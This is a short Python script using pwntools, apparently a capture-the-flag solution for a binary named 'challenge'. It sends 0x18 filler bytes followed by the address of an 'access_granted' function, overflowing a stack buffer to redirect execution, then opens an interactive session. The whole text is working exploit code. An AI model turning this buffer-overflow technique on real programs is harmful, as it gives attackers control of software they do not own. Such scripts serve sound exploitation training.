from pwn import *

elf = ELF("./challenge")

gs = '''
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

p = start()
func = elf.symbols["access_granted"]
log.info(f"[*]access_granted = {hex(func)}")
p.sendafter(b"send your input:\n", b"A"*0x18 + p64(func))
p.interactive()